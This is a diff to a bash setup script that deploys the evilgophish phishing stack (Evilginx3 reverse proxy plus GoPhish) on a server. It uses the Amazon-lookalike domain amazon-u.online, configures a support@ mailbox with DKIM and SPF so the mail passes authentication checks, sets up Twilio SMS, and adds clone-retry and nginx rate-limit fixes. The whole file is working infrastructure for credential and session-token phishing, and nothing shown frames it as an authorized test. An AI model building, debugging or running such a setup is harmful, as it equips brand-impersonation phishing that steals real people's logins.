@@ -1,8 +1,8 @@
 #!/bin/bash
 # setup.sh - Setup for evilgophish with SMTP on Lightsail (3.147.37.21).
-# Changes: Domain amazon-u.online; Turnstile optional; validates src/evilginx,gophish,evilfeed.
+# Changes: Domain amazon-u.online; Turnstile optional; uses src/evilginx3; robust src validation with retry.
 # SMTP: Configures support@amazon-u.online for GoPhish/Evilginx.
-# Fixes: Ensures mailconfig/postfix-main.cf; retries DKIM generation.
+# Fixes: Ensures mailconfig/postfix-main.cf; retries DKIM; fixes src/evilginx3 missing error.
 # Usage: ./setup.sh [DOMAIN] [SUBDOMAINS] [PROXY_ROOT] [FEED_ENABLED] [RID_REPLACEMENT] [TWILIO_SID] [TWILIO_TOKEN] [TWILIO_PHONE] [TURNSTILE_PUBLIC] [TURNSTILE_PRIVATE] [SMTP_USER] [SMTP_PASS]
 # Best Practices:
 # - Validate src dirs; backup configs; secure secrets.
@@ -65,12 +65,14 @@ http {
   log_format main '$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent"';
   access_log /var/log/nginx/access.log main;
   error_log /var/log/nginx/error.log warn;
+  limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;
   upstream evilginx { server evilginx:443; }
   server {
     listen 443 ssl http2;
     server_name _;
     ssl_certificate /etc/nginx/ssl/fullchain.pem;
     ssl_certificate_key /etc/nginx/ssl/privkey.pem;
+    limit_req zone=mylimit burst=20;
     location / { proxy_pass https://evilginx/; proxy_set_header Host $host; proxy_ssl_verify off; }
   }
   server { listen 80; server_name _; return 301 https://$host$request_uri; }
@@ -106,15 +108,29 @@ echo "- A: mail.$DOMAIN -> 3.147.37.21"
 echo "- MX: @ -> mail.$DOMAIN (priority 10)"
 echo "- SPF: TXT v=spf1 mx a ip4:3.147.37.21 ~all"
 
-# Clone and validate src
-[ ! -d ./src ] && git clone https://github.com/c04ch1337/evilgophish.git src
-cd src
-git pull
-for dir in evilginx gophish evilfeed; do
-  [ ! -d "./$dir" ] && { echo "Error: src/$dir missing. Ensure repo includes $dir code."; exit 1; }
-  [ ! -f "./$dir/main.go" ] && { echo "Error: src/$dir/main.go missing. Verify repo integrity."; exit 1; }
+# Clone and validate src with retry
+MAX_RETRIES=3
+for ((i=1; i<=MAX_RETRIES; i++)); do
+  echo "Attempt $i/$MAX_RETRIES to clone repository..."
+  rm -rf src
+  if git clone https://github.com/fin3ss3g0d/evilgophish.git src; then
+    cd src
+    git pull
+    for dir in evilginx3 gophish evilfeed; do
+      [ ! -d "./$dir" ] && { echo "Error: src/$dir missing in repo."; break; }
+      [ ! -f "./$dir/main.go" ] && { echo "Error: src/$dir/main.go missing."; break; }
+    done
+    cd ..
+    [ -f "src/evilginx3/main.go" ] && break
+  fi
+  [ $i -eq $MAX_RETRIES ] && { echo "Error: Failed to clone valid repo. Check https://github.com/fin3ss3g0d/evilgophish."; exit 1; }
 done
-cd ..
+
+# Final validation
+for dir in evilginx3 gophish; do
+  [ ! -d "src/$dir" ] && { echo "Error: src/$dir missing after clone."; exit 1; }
+  [ ! -f "src/$dir/main.go" ] && { echo "Error: src/$dir/main.go missing."; exit 1; }
+done
 
 # RID replacement
 cd src
@@ -148,7 +164,7 @@ cat > Dockerfile.evilginx << 'EOF'
 FROM golang:1.21-alpine AS builder
 RUN apk add --no-cache git
 WORKDIR /src
-COPY src/evilginx .
+COPY src/evilginx3 .
 RUN go mod download && CGO_ENABLED=0 go build -o /app/evilginx .
 FROM alpine:latest
 RUN apk add --no-cache ca-certificates iptables ip6tables
@@ -194,4 +210,4 @@ echo "Upload: cp file.csv uploads/; docker cp uploads/file.csv gophish:/app/uplo
 echo "Test SMTP: docker exec mailserver swaks -tls -au $SMTP_USER -ap '$SMTP_PASS' --from $SMTP_USER --to your@email.com --server localhost:587 -body 'Test'"
 echo "DNS: Configure Lightsail (see README); GoDaddy NS to Lightsail."
 echo "Clean: docker compose down -v; sudo mv /etc/hosts.bak /etc/hosts"
-echo "Debug: docker logs -f mailserver; ls mailconfig/opendkim/keys/$DOMAIN; ls src/evilginx"
+echo "Debug: docker logs -f mailserver; ls mailconfig/opendkim/keys/$DOMAIN; ls src/evilginx3"
